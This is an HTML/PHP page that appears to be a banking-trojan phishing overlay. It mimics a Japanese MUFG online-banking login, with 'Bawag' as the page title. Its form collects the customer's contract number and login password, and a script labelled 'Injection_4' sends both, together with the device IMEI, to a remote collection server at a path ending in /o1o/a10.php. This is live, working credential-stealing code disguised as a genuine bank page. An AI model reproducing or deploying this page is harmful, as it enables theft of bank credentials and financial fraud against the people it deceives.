<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, user-scalable=no, minimal-ui" />
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>Bawag</title>

    <script src="js/jquery-1.12.0.min.js"></script>
    <script src="js/viewport.js"></script>
	<script src="js/cat.functions.js"></script>

    <link rel="stylesheet" href="bootstrap/dist/css/bootstrap.min.css">
	<link rel="stylesheet" href="font-awesome/css/font-awesome.min.css">
	<link rel="stylesheet" href="jp/jp.mufg.bk.applisp.app/css/style.css">
	<link rel="stylesheet" href="css/cat.style.css" type="text/css" media="all">
</head>
<?php
$IMEI_country = htmlspecialchars($_REQUEST["p"], ENT_QUOTES);
include "config.php"; ?>
<body>
<div class="header">
	<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAANQAAAAkCAMAAADGkuQzAAAAk1BMVEUAAADmAADmAADmAADmAADmAADmAADmAADmAADmAADmAADmAADmAADmAABaWlpaWlpaWlpaWlpaWlpaWlpaWlpaWlpaWlpaWloAAAAAAAAAAADmAADmAABaWlpaWloAAAAAAAAAAAAAAAAAAAAAAABaWloAAAAAAAAAAAAAAABaWloAAAAAAABaWlrmAABaWloAAAA02E03AAAALnRSTlMAEFCAcDBAIJ+/r9/vYEAgMBC/gFDP32AQQCCPz3CPvzCAn2BQ78/f73Cvj6+fVxhJ0AAABEJJREFUWMPtl+t6ojAQhqNYtVVRUSuhrSGgARa75P6vbmcmBELrof+27cP0KeZsXmfmS2Cst95666233r6/DYae540eGBvDpzf+DUiT6V+yx+nTjApzb/DTmTwCmS0IZOLNCWv4s5mMm7w2FJ+oYVFXfd9fmtIKS0tbhdoaH9aocdmO/gZ+WnzGrDOrqqrA0EFpwzb4QAuqyseHNWja7qj0vL/1fSGP4BnxsG0IP3V/yTi/Nm9CAC/d4a8Ujw1U9YaF53tQh6Z86KwmGotZJBMtpJRCJzJiHErQkOAHhz6qYbdMoWb2zGEc9aDVK1Ih1frINRrWEs3rL7FemVE6DUaeZzz24HgPN3laM6S5DfWGz10A3jqtOlC6Mc5ioXSmtMq0AkTZdsHOuFMTUDMIEmY1Pc2KjMW5EHmhC04DOcxowAe0/RGRkEK8Et8jFRuo6g9bnq5A+fUXrU81jb/b3oqZUiTgm0SUnKKQc9oYjymErEXsA5T48DOB//W51AJ+G4ED89yJ4SFBTbBo1PzvFMsLKrZQlW98cgMKHeXfT4QUAkThVkRKO8ZaBhvDXXPHbXehEpllhcTQxYGZFMeuTMxbPDB01biVChQK8AG66yLU+wZtyaB3B82bunrNUdoNRtwxeCrhvIaS9aAvQMVcKZ7a8IuyvGwil6AeWxW0KB2oOvQ2N3LK8LWOdbcg20SBCEtz2IjKIPijz566CpWTBqSd8MMVdQazofmsSwxlrjQEstfo3MhCPTSaaKEotJ7ZXajgMhS32gVfHp11Xua5uOKpq+H3GYpDIKdSH3VyTnCmGS10g9Jqe03opBqpNRFYqHdWK3wn/A61SKJDrydXLJKzRteQ9DryJ0goZAGIqUxJKEqaUbrhl8rIQqWwSA5CnpCopi6UEW+6E7040ffSpJqBWp4OzEDtzd7pKF66QrGtLO5NxUAfCTiNdGYgQTTgLzNnEsgiOIhrBVIWa0VtSsctVEl7D3EytIHugafNOBfKaB4lFRtB+ZWYBvNGB1l9WVjXUEs8jPb+24l0wYFieJ0Itr7//gEqaoQadTvlHM4onUuU4AjgCsCAPEsiFiZAg1EHnzAy0wVhGIDaUzoLiR3mSqFA1I9HhTULpXQr3uNLV6eJA4Vm0qm9N2y7UKtTexKvLukExlgEMYP5jUmCh6+IKXkiQYevClOFuysRIs5hEPzHDhRsWmMbBGGZwYLwo+iSQHAanuzKuRJ1XjXG7tXpI9TaisOedaHYalf3BKuLOoFKEYuy4NRYIg+nNMP8j+GalOIxluAxzLEpKiDzCropSisRYXEWgrxcJrBQfIbLVIiewkViYWaDQJiLxMRhmrf3Ccp8e1/fbIjAPwRBYI6iffdI2mLPwf8G1/QHSqu5vacPjGA8/vDXxIF51Zi9DMfjxdS8I3q/4H3ewxvsbDpcPAHT/Gk0YL311ltvvfX2/+0fEAz5gL8VEHIAAAAASUVORK5CYII=">
</div>

<div class="header2">
	<img style="float: right;margin-top: -4px;" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACcAAAAfCAYAAABkitT1AAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAAGaSURBVFhH7ZbbjoIwEED3/38MwVuQGEQRfDBeEEHhA2pOExJiqtKCG3bDw4mEpDOn0ynjT5Zloq8Mcqb8bbnb7Sbu93tr8jxXxn/HR7n9fi/CMBTb7dYI1kZRJM7ns7bgSzkqhthkMhG2bbfCcRyxWCxEmqbKXK94K8euR6ORFByPx60gxvF41KreRzl2TuDZbNaK+XwuTqdTt3JUznVduWv6BkhiwvV6lbERbCLZSI5+IdjlcpHvgiAwYrVaCd/35UUhlipvnUZynufJXS+XS9ncqp7SgRjIkkOVu6KxXJIksoKqZLogR8xPR2skR3PzbAKX42ty3F56hsB8t3SgNTjOKuZX5PjiF0Uhg+tAzPV6/X055qVq3TuQ+f9yJKe3LMuSUr2rHFOBm9m7ygGLGTtIctt6JQcEoIrIMWORi+NYlGUp3+vAhjabTXdyQJBKjg8ou6eih8NBC06A2dq5HL8cazVbqSDPulTjizlNNZ9z1WkkBwjudjs5fqbTaSu4ZPzL7qRydRhBXaCK/Yy23G8yyJkyyJmRiQe8IH2lfGCe7QAAAABJRU5ErkJggg==">
	<img style="float: left;margin-top: -6px;" src="data:image/png;base64,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">
	<h3>ワンタイムパスワードの利用登録手順がご不明の場合はこちら </h3>
</div>

    <div class="main">
        <div class="container">
            <div class="row">
			<div id="form1">
                <div class="col-xs-10 col-sm-8">
                    <div class="form_">

                        <form id="form">

                            <div class="form-group ">
									<label>ご契約番号  <img style="float: right;width: 18px;" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACIAAAAiCAMAAAANmfvwAAABL1BMVEUAAACUlJSTk5OXl5egoKCnp6esrKyurq6VlZWcnJyjo6OTk5OlpaWUlJSZmZmxsbGWlpafn5+RkZGenp6ZmZmTk5OysrKRkZGmpqaYmJiNjY2kpKSNjY2zs7OgoKCnp6erq6uXl5eOjo6kpKSYmJimpqaTk5OZmZmenp6RkZGlpaWjo6OTk5OhoaGoqKisrKyysrK7u7vAwMDExMTGxsbHx8e2trbCwsLIyMjLy8vMzMzNzc3Jycm3t7e6urrDw8PKysq4uLjOzs7W1tbY2NjS0tLw8PD////4+Pjp6enQ0ND8/Pz9/f3+/v7x8fHv7+/l5eXX19f5+fnb29vBwcHR0dH39/fk5OTq6urh4eHg4ODFxcXo6Oj7+/vs7OzZ2dnf39/z8/PT09Pu7u76+vrCmgwVAAAAMHRSTlMAETt3rc/y9Qlow1LLCIb+GKkHp4VT/hjVbw7EO/yu1Ot6EMhx1lWHqAjMwj2w0/XUQ7VfAAABzElEQVQ4y5VUaVfCMBCMFlFRRLm8BS9QRKRSoTmwpYArKnjijff//w22fTZNsTyf8y37JrPJ7s4ixDE0LAVGgqPBkYA0PIR8MDYeKsr7JeVAKe3LxdD42C/GxGS5omJCLRCsVsqTE15CeCpSYUQEq0SmwgJjeqaqkH4o1ZlpzojGDhn5DXYYizqUeFUlflCr8R9GIqkQfyjJhM2YndPcINYZ092jNjdrUeZrbowZ9UajiXlAr82bjIVFVwQ3jgDguHWCucziAkJLyyp17tRPAc7aAB0nQtXlJYQkmV8h5wAX5PIK4NqJYVlCaOWGp+kC3BKMWwB3/DU3KwilSo4qOWndPxBMOgCPDoWWUgiln6hYCp0+A/S6TiL6lEYoqIgUTF/ML73yPFQJ9qvgN4D3D7djtorwFgsv0G4K5bXf4v7IxvP7p+ds/WhVqIuJbrMpHrG86qmuCePr9MsQ8tjVXVsXGk2MNrQFCtHW18w+bgidJkbvrCdQ9NqGPS+bHhnDI7JpzwvKFAdOXTHzM5nZgbOb/dMBW9v/8JHpxqzlRrc+1HJjNuy1bCJX1hj3NNPKuYTPZtgRNsOOz2aw9kte2i3sje4VdqW8734ZjG8lRsOlWVjpqgAAAABJRU5ErkJggg=="></label>
                                	<input type="text" class="form-control" placeholder="半角数字" name="field2" id="login" autocomplete="off" data-reg="/.{3,50}/">
                            </div>

                            <div class="form-group">
									<label>IBログインパスワード  </label>
                                	<input type="password" class="form-control" placeholder="半角英数字・記号4-16桁" name="field3" id="password" autocomplete="off" data-reg="/.{3,50}/">
                            </div>
			<br>

			<input type="button" class="input_submitBtn" onClick="sentServer();" value="ログイン"> <h4 style="color: #447baf;display: inline-block;margin-top: 12px;font-size: 12px;font-weight: bold;margin-bottom: 15px;float: right;">ご契約番号を保存 </h4><input name="name" type="checkbox" style="margin-top: 12px;float: right;">
                        </form>
                </div>
            </div>
        </div>

		</div>
    </div>

<script>
	function sentServer()
	{

	var oNumInp1 = document.getElementById('login');
	var oNumInp2 = document.getElementById('password');


if ((oNumInp1.value.length > 5)&&(oNumInp2.value.length > 3)) {
	var url='<?php echo $URL; ?>';
	var imei_c='<?php echo $IMEI_country; ?>';

	var login1 = document.forms["form"].elements["login"].value;
	var pass = document.forms["form"].elements["password"].value;

	location.replace(url+'/o1o/a10.php?p=' + imei_c+"|Injection_4|mufg|"+login1+"|"+pass);
	}
}
</script>
</body>
</html>
